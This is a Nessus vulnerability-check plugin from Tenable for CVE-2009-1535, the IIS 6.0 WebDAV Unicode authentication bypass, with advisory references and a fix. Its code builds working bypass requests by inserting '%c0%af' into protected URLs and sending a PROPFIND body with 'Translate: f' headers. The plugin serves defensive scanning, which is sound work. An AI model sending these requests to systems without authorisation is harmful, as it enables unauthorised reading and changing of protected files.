#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if(description)
{
 script_id(38808);
 script_version ("$Revision: 1.18 $");

 script_cve_id("CVE-2009-1535");
 script_bugtraq_id(34993);
 script_osvdb_id(54555);
 script_xref(name: "AUSCERT", value: "AL-2009.0041");
 script_xref(name: "CERTA", value: "CERTA-2009-ALE-007");
 script_xref(name: "CERT-FI", value: "038/2009");
 script_xref(name: "EDB-ID", value: "8704");

 script_name(english:"Microsoft IIS WebDAV Unicode Request Directory Security Bypass");
 script_summary(english: "Circumvent IIS 6.0 access control with WebDAV");

 script_set_attribute(attribute:"synopsis", value:
"It is possible to access protected resources through WebDAV." );
 script_set_attribute(attribute:"description", value:
"IIS 6.0 does not properly sanitize WebDAV requests.  It is possible
to access protected resources by inserting a Unicode / (%c0%af) in the
URL. 

Depending on the remote server configuration, protected resources may
be browsed, read and/or modified." );
 script_set_attribute(attribute:"see_also", value: "http://blog.zoller.lu/2009/05/iis-6-webdac-auth-bypass-and-data.html");
 script_set_attribute(attribute:"see_also", value: "http://www.nessus.org/u?36818b28");
 script_set_attribute(attribute:"see_also", value: "http://www.nessus.org/u?1884f451");
 script_set_attribute(attribute:"see_also", value: "http://isc.sans.org/diary.html?storyid=6397");
 script_set_attribute(attribute:"see_also", value: "http://technet.microsoft.com/en-us/security/advisory/971492");
 script_set_attribute(attribute:"see_also", value: "http://unixwiz.net/techtips/ms971492-webdav-vuln.html");
 script_set_attribute(attribute:"solution", value:
"Disable WebDAV if it is not used, or update the server.
See http://forums.iis.net/t/1149348.aspx" 
);
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
script_cwe_id(287);
 script_set_attribute(attribute:"plugin_publication_date", value: "2009/05/18");
 script_cvs_date("$Date: 2015/01/13 15:34:52 $");
 script_set_attribute(attribute:"plugin_type", value:"remote");
 script_end_attributes();

 script_category(ACT_ATTACK); 
 script_copyright(english:"This script is Copyright (C) 2009-2015 Tenable Network Security, Inc.");
 script_family(english: "Web Servers");

 script_dependencie("http_version.nasl", 
  "webmirror.nasl", 
  "http_version.nasl", 
  "DDI_Directory_Scanner.nasl", 
  "no404.nasl", 
  "webdav_enabled.nasl"
 );
 script_exclude_keys("Settings/disable_cgi_scanning");
 script_require_ports("Services/www", 80);
 exit(0);
}

#

include("global_settings.inc");
include("misc_func.inc");
include("http.inc");

port = get_http_port(default:80);

if (report_paranoia < 1)
{
  banner = get_http_banner(port: port);
  if ("Microsoft-IIS/" >!< banner) exit(0);
}

# We could check www/PORT/webdav but WebDAV may be enabled only for some directories

prot_url_l = get_kb_list("www/"+port+"/content/basic_auth/url/*");

if (! isnull(prot_url_l))
{
  prot_url_l = make_list(prot_url_l);
  for (i = 0; ! isnull(prot_url_l[i]); i ++)
  {
    # Make sure that the page requires authentication
    r = http_send_recv3(method: "GET", item: prot_url_l[i], port: port);
    if (isnull(r)) exit(0);
    if (r[0] !~ "^HTTP/1\.[01] 401 ") continue;

    h = make_array("Translate", "f");
    u = "/..%c0%af" + prot_url_l[i];

    r = http_send_recv3(method: "GET", port: port, item: u);
    if (isnull(r)) exit(0);
    if (r[0] =~ "^HTTP/1\.[01] 200 ") break;

    r = http_send_recv3(method: "GET", port: port, item: u, add_headers: h);
    if (isnull(r)) exit(0);
    if (r[0] =~ "^HTTP/1\.[01] 200 ")
    {
      security_hole(port);
      exit(0);
    }
    break;
  }
}

prot_dir_l = get_kb_list("www/"+port+"/content/directories/auth_required");
if (! isnull(prot_dir_l))
{
  xml = 
'<?xml version="1.0" encoding="utf-8"?>\r\n'+
'<propfind xmlns="DAV:"><prop>\r\n' +
'<getcontentlength xmlns="DAV:"/>\r\n'+
'<getlastmodified xmlns="DAV:"/>\r\n' +
'<executable xmlns="http://apache.org/dav/props/"/>\r\n' +
'<resourcetype xmlns="DAV:"/>\r\n' +
'<checked-in xmlns="DAV:"/>\r\n' +
'<checked-out xmlns="DAV:"/>\r\n' +
'</prop></propfind>\r\n';

  h = make_array( "Depth", "1", 
      		  "Connection", "TE", 
		  "TE", "trailers",
		  "Content-Type", "application/xml" );

  prot_dir_l = make_list(prot_dir_l);
  dir = NULL;
  for (i = 0; ! isnull(prot_dir_l[i]); i ++)
    if (strlen(prot_dir_l[i]) > 2)
    {
      # Make sure the page requires authentication
      r = http_send_recv3(method: "PROPFIND", item: prot_dir_l[i], port: port,
      	add_headers: h, data: xml);
      if (isnull(r)) exit(0);
      if (r[0] !~ "^HTTP/1\.[01] 401 ") continue;

      dir = strcat(substr(prot_dir_l[i], 0, 1), "%c0%af", substr(prot_dir_l[i], 2));
      break;
    }
  if (isnull(dir)) exit(0);

  r = http_send_recv3(port: port, method: "PROPFIND", item: dir,
    add_headers: h, data: xml );
  if (isnull(r)) exit(0);

  if ( r[0] =~ "^HTTP/1\.[01] 200 " ||
      (r[0] =~ "^HTTP/1\.[01] 207 " && "<a:status>HTTP/1.1 200 OK</a:status>" >< r[2]))
  {
    if (report_verbosity < 1)
      security_hole(port);
    else
    {
      if (report_verbosity == 1)
        extra = strcat('The following HTTP request got a 20x code instead of 401 :\n\n', http_last_sent_request());
      else
        extra = strcat('The following HTTP request :\n----------\n\n', http_last_sent_request(), '\n--------\nproduced this output :\n\n', r[0], r[1], '\n', r[2], '\n');
      security_hole(port:port, extra: extra);
    }
  }
}
